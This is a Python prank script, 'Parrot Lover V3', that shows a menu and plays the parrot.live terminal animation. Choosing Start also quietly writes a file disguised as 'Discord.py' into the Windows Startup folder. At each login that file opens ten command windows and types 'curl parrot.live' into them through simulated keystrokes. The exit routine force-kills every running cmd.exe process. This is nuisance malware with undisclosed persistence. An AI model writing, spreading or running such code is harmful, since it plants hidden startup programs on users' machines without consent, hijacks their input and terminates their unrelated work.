import os
from pystyle import *
from subprocess import call
import psutil
import time
import shutil
name = os.environ.get("USERNAME")
path = r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Discord.py".format(name)
whiteChars = list('@')
logo = """

      :::::::::  :::    :::     :::  :::::::: 
     :+:    :+: :+:    :+:     :+: :+:    :+: 
    +:+    +:+ +:+    +:+     +:+        +:+  
   +#++:++#+  +#+    +#+     +:+     +#++:    
  +#+        +#+     +#+   +#+         +#+    
 #+#        #+#      #+#+#+#   #+#    #+#     
###        ########## ###      ########       
                                                                                                                              
"""
menu = """
═════════════════════════════

         [1] Start  

         [2] Exit 

═════════════════════════════
"""

def startup():

    with open(path, 'w') as f:

        data = """
import os
import subprocess
import pyautogui
import time

for i in range(10):
    os.system(r'start C:\Windows\System32\cmd.exe')
    time.sleep(0.05)
    pyautogui.write('curl parrot.live')
    pyautogui.press("enter")
        
        """
        f.write(data)
        f.close()

def close():
    os.system("cls")
    print(Colorate.Format(Center.XCenter("Bye!"), whiteChars, Colorate.Horizontal, Colors.blue_to_purple, Col.blue))
    time.sleep(1)
    for pid in (process.pid for process in psutil.process_iter() if process.name() == "cmd.exe"):
        os.kill(pid, 9)

def inputs():
    if choice == "1":
        try:
            startup()
            os.system('mode con: cols=50 lines=19')
            os.system("curl parrot.live")
        except KeyboardInterrupt:
            close()

    if choice == "2":
        close()

    else:
        main()


def main():
    os.system("cls")
    global choice
    print(Colorate.Format(Center.XCenter(logo), whiteChars, Colorate.Horizontal, Colors.blue_to_purple, Col.blue))
    print(Colorate.Format(Center.XCenter(menu), whiteChars, Colorate.Horizontal, Colors.blue_to_purple, Col.blue))
    choice = input("")
    inputs()

if __name__ == "__main__":
    os.system("title Parrot Lover V3")
    os.system('mode con: cols=50 lines=30')
    main()
